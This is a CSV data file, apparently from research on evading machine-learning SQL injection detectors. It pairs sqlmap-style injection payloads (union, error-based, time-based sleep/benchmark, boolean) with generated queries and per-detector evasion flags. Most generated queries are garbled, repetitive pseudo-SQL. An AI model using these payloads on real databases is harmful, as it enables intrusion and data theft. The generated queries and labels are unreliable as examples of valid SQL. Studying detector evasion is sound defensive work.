original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL ,1,1,1,0,1,1,0
"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 - SELECT MIN(*) FROM SQL Injection)",0,1,0,0,0,0,0
"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",SELECT MIN(sql injection) FROM SQL -7963'+ WHERE 7039 = 7039 = 7039,0,1,0,1,0,0,0
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM query: 1"" ORDER BY MIN(sql injection)",1,1,1,1,1,1,1
"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",SELECT MIN(sql injection) FROM SQL -5516'+ WHERE 7188 = 7188 = 7188,0,1,1,1,0,1,0
1 where 7055  =  7055,SELECT * FROM query: 1 WHERE NOT SQL_injection = 7055 AND NOT SELECT FROM query: 1 WHERE NOT Query_ 1 = 7055,1,0,1,1,1,1,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,SELECT MIN(%) FROM SQL injection_detection,1,0,0,1,1,1,0
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '","SELECT MIN(7513 = 8586,8586 ) FROM SQL injection detection",1,1,0,0,1,0,0
"1'||  (  select 'iwlj' where 8704  =  8704 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'","SELECT MIN(short_name) FROM SQL_injection, COUNT(sql injection) FROM SQL_injection)",1,0,1,0,1,1,0
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'vkde'  =  'vkde","SELECT MIN(succe) FROM SQL injection detection) AND NOT elt (7982 = 7982,concat) FROM Query: 1'",1,1,0,0,1,0,0
"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_Injection WHERE'sq injection' ='sq injection',1,1,1,0,1,1,0
"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1,1,1,1,1,1,1,1
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT DISTINCT vwyq FROM SQL injection,1,0,1,1,1,1,1
"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"-2365   )    )    union all select 8190,8190#","SELECT DISTINCT esq injection_detect FROM SQL SELECT esq_injection_detect_detect_date FROM query: -2365 ) union All select 8190,8190# FROM query: 0160",1,0,0,1,1,1,0
-2039'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,"SELECT DISTINCT esq_injection FROM SQL SELECT esq_injection_detection, COUNT(*) FROM SQL INNER JOIN (SELECT esq_injection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection) +char ( 113 ) +char (SELECT MIN(SQL) FROM SQL SELECT MIN( 2724 = 2724 AND NOT char( 113 ) +char ( +char ( +char ( +char ( 113 ) FROM SELECT MIN(SQL) FROM SQL SELECT, COUNT( ) FROM SELECT MIN(2724 = 2724) +char ( +char ( +char ( +char ( +char ( +char ( +char) FROM SELECT, COUNT( ) FROM SQL SELECT, '+24 in ((SELECT ",1,1,0,0,1,0,0
"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","SELECT pwvr FROM ""sql injection detection"" FROM SQL JOIN 1'+ (SELECT pwvr FROM Query: 1'+) ORDER BY hex ( randomblob ( 500000000000/2 )",1,1,0,0,1,0,0
1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,SELECT MIN(sdo ) FROM SQL injection detection) FROM SQL SELECT MIN(sdo ) FROM SQL SELECT MIN(sdo ) FROM SQL,1,0,1,1,1,1,1
"1""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7  (SELECT MIN(*) FROM SQL))",0,1,0,0,0,0,0
"1"" where 1115  =  1115 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_Injection WHERE 1115 = 1115 OR 8384 = like (SELECT MIN(500000000000/2 ) FROM SQL SELECT MIN(500000000000) FROM Query: 1),1,1,0,0,1,0,0
"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  ""","SELECT MIN(s) FROM SQL injection_description) FROM SQL SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SQL SELECT 0x7171706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, SELECT SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT SELECT MIN(s) FROM SELECT SELECT MIN(s) FROM SQL SELECT SELECT MIN(s) FROM (SELECT MIN(s) FROM SQL SELECT SELECT MIN(s) FROM (SELECT MIN(s) FROM SQL SELECT SELECT MIN(s) FROM (SELECT MIN(s) FROM SQL SELECT SELECT MIN(s) FROM (SELECT MIN(s) FROM SQL SELECT SELECT ",1,1,0,0,1,0,0
"-3436  )   or elt  (  1032  =  1032,3623  )  ","SELECT NOT SQL_inject SQL_inject FROM query: -3436 - or elt ( 1032 = 1032,3623)",1,1,0,0,0,0,0
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM query: 1' ORDER BY MIN(sql injection),1,1,1,0,1,1,0
"1%'  )   union all select null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1%'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '","SELECT DISTINCT'sql injection' FROM SQL SELECT MIN(sql injection)' FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM (SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT,upper ( ( ((((( % ='sql injection')",1,1,0,0,1,0,0
"1""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""qgle"" like ""qgle","SELECT 0x71706a71, (SELECT MIN(s) FROM SQL injection detection) FROM SQL SELECT 0x7171706a71, (SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SQL)",1,1,0,0,1,0,0
1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,SELECT 'lxyu' FROM SQL injection detection',1,0,1,1,1,1,1
" select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT SUM(((((((((((((((((()) FROM query: query: Query: Query: Query: Query: Query: Query: Query: Query: Query: 0 / COUNT(*) FROM query: SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT SUM((SELECT * FROM SQL_searcher: query: query: Query: Query: Query: zlal = 'zlal') AND NOT ( (,1,1,0,1,1,1,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""%""  =  ""","SELECT COUNT(*) FROM generate_series WHERE NOT SQL_injection = ""valid""",1,0,0,0,1,0,0
"1'||  (  select 'drna' from dual where 5082  =  5082 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'","SELECT DISTINCT t1.drna FROM SQL injection AS t1 JOIN 5082 = 5082 AND t2.500000 = t2.5000000, md5 ( 0x76555642 ) ||' FROM SQL injection detection'",0,1,0,0,0,0,0
"1%"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
"1 union all select null,null,null,null#","SELECT MIN(sql injection) FROM SQL SELECT MIN(null,null,null#) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM database WHERE NOT null = 1",1,1,0,0,1,0,0
"1%""  )   union all select null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"-9356 or elt  (  1032  =  1032,3623  )  -- izgi","SELECT izgi FROM query: -9356 or elt ( 1032 = 1032,3623 ) FROM izgi WHERE NOT izgi = ""valid""",1,1,0,0,1,0,0
1   )    )    order by 1#,"SELECT * FROM query: 1# WHERE NOT SQL_injection = ""valid"" ORDER BY 1#",1,0,1,0,0,0,0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null, null, null-- sulf injection detection,'sq'",1,0,1,0,0,0,0
"1""   )    )    as yosd where 1255  =  1255",SELECT MIN(1255 = 1255) FROM SQL injection detection,1,1,0,1,1,1,0
"1%""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL injection detection,1,0,1,1,1,1,1
"1""  )   as kslq where 8669  =  8669 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE 8669 = 8669 AND 8635 = (SELECT MIN(1,5000000) FROM generate_series) FROM kslq WHERE 8669 = 8669 AND NOT 8635 = (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT SUM(SQ_1) FROM SELECT SUM(SQL) FROM SELECT MIN(SELECT MIN(SELECT MIN(1,5000000) FROM generate_series WHERE kslq = 8669 = 8635 = 8635 = 8635 = 8635 = 8669)",1,1,0,0,1,0,0
"1"" union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",SELECT MIN(sleep) FROM SQL injection detection) FROM SQL SELECT MIN(sleep) FROM query: 1',1,1,0,0,1,0,0
1  )   and 7533  =  7533 and   (  7175  =  7175,SELECT * FROM SQL AS t1 JOIN 1 query: 1 JOIN 7533 = 7533 AND 7175 = 7175,0,1,1,0,0,0,0
"1""   )    )    and 7533  =  7533 and    (    (   ""gkca""  =  ""gkca","SELECT MIN(""sql injection detection"") FROM SQL injection detection",1,0,1,1,1,1,1
"-4711%""   )    )    union all select 6737,6737,6737,6737#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(SQL) - XML_code) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SEL,1,1,1,0,1,1,0
-7675%'   )    )     )   order by 1--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
1'+  (  select goec where 9460  =  9460 rlike   (  select   (  case when   (  4740  =  1203  )   then 1 else 0x28 end   )    )     )  +',SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: 1'+ (SELECT MIN(sql injection) FROM Query: 1'+),1,1,0,0,1,0,0
1'  )   where 3730  =  3730 and sleep  (  5  )  #,SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
"1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","SELECT MIN(sql injection) FROM SQL JOIN 5509 = 5509 OR 5514 = benchmark (5000000,md5 ( 0x544d5a4c )",0,1,0,0,0,0,0
"1'||  (  select 'bmyt' from dual where 9407  =  9407 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",SELECT MIN(sequence) FROM SQL injection detection) FROM SQL - SELECT 'bmyt' FROM'sql injection',1,1,1,1,1,1,1
"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",SELECT * FROM SQL AS _candid_required FROM Query: 1 JOIN 8671 = 8671 AND make_set = 4931 = 1642 OFFSET 1642,0,0,0,1,1,1,0
-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,SELECT MIN(suel injection) FROM SQL_injection) ORDER BY 5903 DESC LIMIT 1,0,0,1,1,1,1,1
-2431'  )   or 8571  =  8571--,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM Query: -2431' OR 8571 = 8571 - - SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(8571 = 8571 - SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(s,1,1,0,0,1,0,0
"-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134","SELECT * FROM SQL AS _8599, 'elt', MIN(1134 = 1134) FROM query: -8599 ) or query: -8599 ) or elt = 'elt'",1,1,0,0,1,0,0
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",SELECT NOT (SELECT SUM(Null) FROM SQL) FROM query: 1 ORDER BY SUM(null),1,0,1,0,1,1,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'rkoe'  =  'rkoe","SELECT * FROM SQL injection, COUNT(*) FROM rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 AND ((*) = 'rkoe')",1,1,0,0,0,0,0
"1'  )   as jxqt where 4322  =  4322 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection_detecting WHERE 4322 = 4322 OR char ( 75 ) ||char ( 69 ),1,1,0,0,0,0,0
"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",SELECT MIN(sqlid_to_sqlhash) FROM SQL injection JOIN (SELECT SUM(sqlid_to_sqlhash) FROM dbms_utility.sqlid_to_sqlhash) ORDER BY 113,0,0,1,0,1,1,0
"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#","SELECT MIN(sql injection) FROM SQL - SELECT 3081,3081,3081,3081,3081,3081,3081,3081# FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql - XX) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT",1,1,1,0,1,1,0
"1"" where 6325  =  6325 union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"1%""   )    )    union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM,1,1,1,0,1,1,0
"1%"" and 2006  =  2006",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(selection) FROM SQL injection detection WHERE NOT 0x7171706a71 = ""SQL"" ORDER BY 0x7171706a71,floor (Rad ( 0 ) *2 )",1,1,0,0,0,0,0
"1%'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sys1,sysusers as sys4,sysusers as sys7  (SELECT MIN(*) FROM SQL))",1,1,0,0,0,0,0
-5327'   )    )     )   or 1606  =  6099,SELECT MIN(6099) FROM SQL injection detection,1,0,1,1,1,1,1
"-2518' union all select 6818,6818,6818,6818,6818,6818#","SELECT 6818,6818,6818,6818 FROM SQL_Injections WHERE NOT 6818,6818,6818,6818 = ""SQL injection detection""",1,1,1,1,0,1,0
"-8654' union all select 7190,7190,7190,7190,7190#","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -8654' union All select 7190,7190,7190,7190,7190,7190# FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -8654' union All select 7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,7190,",1,1,1,0,0,0,0
